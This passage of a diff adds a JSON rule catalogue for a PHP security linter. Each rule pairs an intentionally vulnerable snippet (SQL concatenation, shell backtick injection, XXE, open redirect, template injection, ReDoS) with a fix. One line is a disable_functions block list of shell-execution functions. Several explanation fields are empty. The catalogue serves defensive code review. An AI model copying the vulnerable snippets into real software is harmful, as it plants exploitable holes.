+        "`phpinfo(INFO_ALL)` or `phpinfo(INFO_GENERAL)` etc."
+      ]
+    },
+    {
+      "rule_code": "E0077",
+      "title": "E0077: Display errors enabled",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "ini_set('display_errors', '1');\nini_set('error_reporting', 'E_ALL');",
+      "good_example": "ini_set('display_errors', '0');\nini_set('log_errors', '1');\nini_set('error_log', '/var/log/app_errors.log');\n// In production: display_errors = Off, log_errors = On",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`ini_set('display_errors', '1')` / `ini_set('display_errors', 'true')`",
+        "`error_reporting(E_ALL)` without `display_errors = Off`",
+        "`.htaccess` / `.user.ini` directives enabling `display_errors`"
+      ]
+    },
+    {
+      "rule_code": "E0078",
+      "title": "E0078: Variable variables",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "extract($_GET); // attacker sends ?is_admin=1\nif ($is_admin) {\n    grantAdminAccess();\n}",
+      "good_example": "// Access request data explicitly through superglobals\n$username = $_GET['username'] ?? null;\n$is_admin = checkUserRole($username); // server-side check, never from request",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`extract()` with `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, or other tainted arrays",
+        "`$$var` variable variables where `$var` originates from user input"
+      ]
+    },
+    {
+      "rule_code": "E0079",
+      "title": "E0079: Dynamic method call",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$method = $_GET['method'] ?? '';\n$obj->$method();",
+      "good_example": "$method = $_GET['method'] ?? '';\n$allowed = ['getData', 'save', 'view'];\nif (!in_array($method, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$obj->$method();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`$obj->$method()` where `$method` is a variable from user input",
+        "`$obj->{$method}()` with a tainted method name",
+        "`call_user_func([$obj, $method])` with tainted method name"
+      ]
+    },
+    {
+      "rule_code": "E0008",
+      "title": "E0008: Return type signature",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "class UserService {\n    // Missing return type signature\n    public function getUser($id) {\n        return $this->repository->find($id);\n    }\n}",
+      "good_example": "class UserService {\n    // Explicit return type signature\n    public function getUser(int $id): ?User {\n        return $this->repository->find($id);\n    }\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Scans method declarations for missing return type signatures."
+      ]
+    },
+    {
+      "rule_code": "E0080",
+      "title": "E0080: Weak cryptographic function",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$hash = crypt($password, '$1$saltsalt$'); // MD5-based crypt, weak\n$hash = crypt($password);                   // uses system default, may be weak",
+      "good_example": "$hash = password_hash($password, PASSWORD_DEFAULT);\n// Uses bcrypt or argon2 with automatic salt and cost factor\nif (password_verify($password, $hash)) {\n    // valid\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`crypt()` calls used for password hashing",
+        "`crypt()` without a proper salt parameter"
+      ]
+    },
+    {
+      "rule_code": "E0081",
+      "title": "E0081: Deprecated regex function",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "if (ereg(\"^[a-zA-Z]+$\", $username)) { // deprecated, removed in PHP 7.0\n    // valid\n}\n$parts = split(\":\", $data); // deprecated, removed in PHP 7.0",
+      "good_example": "if (preg_match(\"/^[a-zA-Z]+$/\", $username)) {\n    // valid\n}\n$parts = explode(\":\", $data); // or preg_split(\"/:/\", $data)",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`ereg()`, `ereg_replace()`, `eregi()`, `eregi_replace()` calls",
+        "`split()`, `spliti()` calls"
+      ]
+    },
+    {
+      "rule_code": "E0082",
+      "title": "E0082: Dynamic extension loading",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "dl('my_extension.so'); // loads extension at runtime\ndl('php_mysql.dll');",
+      "good_example": "// Install extensions via the system package manager or PECL\n// Enable them in php.ini instead of loading at runtime\n// extension=my_extension.so",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`dl()` function calls anywhere in the code"
+      ]
+    },
+    {
+      "rule_code": "E0083",
+      "title": "E0083: Open redirect",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$url = $_GET['redirect'] ?? '';\nheader(\"Location: $url\");\nexit;",
+      "good_example": "$url = $_GET['redirect'] ?? '';\n$allowed = ['/dashboard', '/profile', '/login'];\nif (!in_array($url, $allowed, true)) {\n    $url = '/dashboard';\n}\nheader(\"Location: $url\");\nexit;",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`header(\"Location: ...\")` with tainted input",
+        "`header(\"refresh: ...;url=...\")` with tainted input"
+      ]
+    },
+    {
+      "rule_code": "E0084",
+      "title": "E0084: SQL query string concatenation",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$id = $_GET['id'] ?? '';\n$result = mysqli_query($conn, \"SELECT * FROM users WHERE id = $id\");",
+      "good_example": "$id = $_GET['id'] ?? '';\n$stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->execute([$id]);\n$user = $stmt->fetch();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`mysqli_query()`, `mysqli::query()`, `pg_query()`, `pg_exec()`, `PDO::query()`, `PDO::exec()` calls",
+        "Where user input (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, etc.) is concatenated directly into the SQL string"
+      ]
+    },
+    {
+      "rule_code": "E0085",
+      "title": "E0085: Inline PHP execution short tags",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "<?= $userInput ?>\n<?= $variable ?>",
+      "good_example": "<?php echo $userInput; ?>\n<?php echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8'); ?>",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`<?= ... ?>` short echo tags in PHP files",
+        "`<?` short open tags (without `php`)"
+      ]
+    },
+    {
+      "rule_code": "E0086",
+      "title": "E0086: Deprecated session function",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "session_register('username');\n$username = $_POST['username'] ?? '';\nif (session_is_registered('username')) {\n    // ...\n}\nsession_unregister('username');",
+      "good_example": "$_SESSION['username'] = $_POST['username'] ?? '';\nif (isset($_SESSION['username'])) {\n    // ...\n}\nunset($_SESSION['username']);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`session_register()`, `session_is_registered()`, `session_unregister()` function calls"
+      ]
+    },
+    {
+      "rule_code": "E0087",
+      "title": "E0087: Command execution with backticks",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$ip = $_GET['ip'] ?? '';\n$output = `ping -c 4 $ip`;",
+      "good_example": "$ip = $_GET['ip'] ?? '';\nif (!filter_var($ip, FILTER_VALIDATE_IP)) {\n    http_response_code(400);\n    exit;\n}\n$output = shell_exec('ping -c 4 ' . escapeshellarg($ip));",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Backtick operator (`` `$cmd` ``) with tainted input",
+        "`shell_exec()`, `exec()`, `system()`, `passthru()` with tainted input (also covered by E0127-E0131)"
+      ]
+    },
+    {
+      "rule_code": "E0088",
+      "title": "E0088: Reflection-based injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$class = $_GET['class'] ?? '';\n$reflector = new ReflectionClass($class);\n$obj = $reflector->newInstance($_GET['args']);",
+      "good_example": "$class = $_GET['class'] ?? '';\n$allowed = ['User', 'Product', 'Order'];\nif (!in_array($class, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\n$reflector = new ReflectionClass($class);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`ReflectionClass`, `ReflectionMethod`, `ReflectionProperty` constructed from tainted input",
+        "`ReflectionMethod::invoke()`, `ReflectionMethod::invokeArgs()` with tainted method names"
+      ]
+    },
+    {
+      "rule_code": "E0089",
+      "title": "E0089: Log injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "error_log(\"User {$_GET['username']} logged in\");\n// ?username=admin%0d%0aInjection: fake entry",
+      "good_example": "$username = str_replace([\"\\r\", \"\\n\"], '', $_GET['username'] ?? '');\nerror_log(\"User $username logged in\");",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`error_log()`, `syslog()`, `trigger_error()` with tainted superglobals directly interpolated",
+        "Custom log writers (`file_put_contents($log, $user_input)`) with user input"
+      ]
+    },
+    {
+      "rule_code": "E0009",
+      "title": "E0009: Cyclomatic complexity",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "",
+      "good_example": "",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Checks for E0009 violations"
+      ]
+    },
+    {
+      "rule_code": "E0090",
+      "title": "E0090: File write to user-controlled path",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$filename = $_GET['file'] ?? '';\n$content = $_GET['content'] ?? '';\nfile_put_contents(\"/var/www/files/$filename\", $content);",
+      "good_example": "$filename = $_GET['file'] ?? '';\n$allowed = ['profile.txt', 'settings.txt'];\nif (!in_array($filename, $allowed, true)) {\n    http_response_code(400);\n    exit;\n}\nfile_put_contents(\"/var/www/files/$filename\", $content);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`file_put_contents()`, `file()`, `fopen()` with `'w'`, `'w+'`, `'a'`, `'a+'` modes where the path is built from user-controlled input",
+        "`file_get_contents()` used with write contexts (stream contexts)"
+      ]
+    },
+    {
+      "rule_code": "E0091",
+      "title": "E0091: Source code exposure via highlight_file",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "if ($_GET['debug'] === '1') {\n    highlight_file(__FILE__); // exposes entire file source\n}\nshow_source('config.php'); // exposes config file including DB credentials",
+      "good_example": "// Remove entirely — never expose source code to users\n// If debugging is needed, use a local development environment only",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`highlight_file()`, `show_source()`, `highlight_string()` calls",
+        "Especially dangerous when gated by user input (`$_GET['debug']`)"
+      ]
+    },
+    {
+      "rule_code": "E0092",
+      "title": "E0092: XML External Entity (XXE)",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$xml = $_GET['xml'] ?? '';\n$doc = new DOMDocument();\n$doc->loadXML($xml, LIBXML_NOENT); // resolves external entities\n// or\n$xml = simplexml_load_string($xml); // external entities resolved by default",
+      "good_example": "libxml_disable_entity_loader(true); // PHP < 8.0\n$doc = new DOMDocument();\n$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOWARNING);\n// For PHP 8.0+: use XMLReader which doesn't resolve external entities by default\n$reader = new XMLReader();\n$reader->xml($xml);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`simplexml_load_string()`, `DOMDocument::loadXML()`, `DOMDocument::load()` with tainted input and `LIBXML_NOENT` or without `LIBXML_NONET`",
+        "`xml_parser_create()` / `xml_parse()` with default entity handling"
+      ]
+    },
+    {
+      "rule_code": "E0093",
+      "title": "E0093: Template injection",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$template = $_GET['template'] ?? '';\necho $twig->render($template, ['name' => $user->name]);",
+      "good_example": "$template = $_GET['template'] ?? '';\n$allowed = ['welcome', 'goodbye', 'reminder'];\nif (!in_array($template, $allowed, true)) {\n    $template = 'welcome';\n}\necho $twig->render($template, ['name' => $user->name]);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`Twig::render()`, `$twig->render()`, `$smarty->display()`, `$blade->render()` with tainted template names/sources",
+        "Template engines rendering user-controlled strings as template source"
+      ]
+    },
+    {
+      "rule_code": "E0094",
+      "title": "E0094: Denial of service via regular expression",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "$pattern = '/^(a+)+$/'; // catastrophic backtracking on \"aaaaaaaaaaaaaaaaaaaa!\"\npreg_match($pattern, $_GET['input']);\n\n// or user-supplied pattern:\n$pattern = $_GET['regex'] ?? '';\npreg_match($pattern, $text);",
+      "good_example": "// Use simple, bounded patterns\n$pattern = '/^[a-z0-9]{1,32}$/';\npreg_match($pattern, $_GET['input']);\n\n// Use time-limited regex evaluation if user-supplied patterns are unavoidable",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Nested quantifiers in regex patterns: `(a+)+`, `(a*)*`, `(a|b)+` etc.",
+        "User-supplied regex patterns passed to `preg_match()`, `preg_replace()`, `preg_split()`",
+        "`preg_match()` on very long user input without timeout"
+      ]
+    },
+    {
+      "rule_code": "E0095",
+      "title": "E0095: Insecure comparison",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "if ($provided_api_key == $expected_key) {\n    grantAccess();\n}\nif ($signature == $expected) {\n    // VULNERABLE to timing attack\n}",
+      "good_example": "if (hash_equals($provided_api_key, $expected_key)) {\n    grantAccess();\n}\nif (hash_equals($signature, $expected)) {\n    // Constant-time comparison\n}",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`==` or `===` comparisons where one operand is a secret-like variable (`token`, `secret`, `key`, `password`, `hash`, `signature`, `mac`, `hmac`)",
+        "Both operands must be strings for the timing issue to apply"
+      ]
+    },
+    {
+      "rule_code": "E0096",
+      "title": "E0096: Cookie without secure flag",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "setcookie('session_id', $value, [\n    'secure' => false,   // sent over HTTP\n    'httponly' => true,\n]);",
+      "good_example": "setcookie('session_id', $value, [\n    'secure' => true,    // HTTPS only\n    'httponly' => true,  // not accessible via JavaScript\n    'samesite' => 'Lax',\n]);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`setcookie()` or `setrawcookie()` calls where `secure` is not set to `true`",
+        "`session_set_cookie_params()` with `secure => false`"
+      ]
+    },
+    {
+      "rule_code": "E0097",
+      "title": "E0097: Cookie without HttpOnly flag",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "setcookie('session_id', $value, [\n    'secure' => true,\n    'httponly' => false,   // accessible via JavaScript\n]);",
+      "good_example": "setcookie('session_id', $value, [\n    'secure' => true,\n    'httponly' => true,    // not accessible via JavaScript\n    'samesite' => 'Lax',\n]);",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`setcookie()` or `setrawcookie()` calls where `httponly` is not set to `true`",
+        "`session_set_cookie_params()` with `httponly => false`"
+      ]
+    },
+    {
+      "rule_code": "E0098",
+      "title": "E0098: Session ID in URL",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "ini_set('session.use_trans_sid', '1');\nsession_start();\n// Session ID appears in URLs: /page.php?PHPSESSID=abc123",
+      "good_example": "ini_set('session.use_only_cookies', '1');\nini_set('session.use_trans_sid', '0');\nsession_set_cookie_params([\n    'secure' => true,\n    'httponly' => true,\n]);\nsession_start();",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "`session.use_trans_sid = 1` or `ini_set('session.use_trans_sid', '1')`",
+        "Links containing `PHPSESSID` or similar session ID parameters"
+      ]
+    },
+    {
+      "rule_code": "E0099",
+      "title": "E0099: Disable functions bypass",
+      "plain_english": "",
+      "why_matters": "",
+      "bad_example": "// php.ini: disable_functions not set (empty)\n// All functions remain available",
+      "good_example": "// php.ini: disable_functions = exec,system,passthru,shell_exec,popen,proc_open,eval,create_function",
+      "severity": "info",
+      "category": "general",
+      "what_it_checks": [
+        "Cannot read php.ini directly — documents the risk",
+        "`ini_set('disable_functions', ...)` is PHP_INI_SYSTEM and cannot be changed at runtime"
+      ]
+    }
+  ]
+}
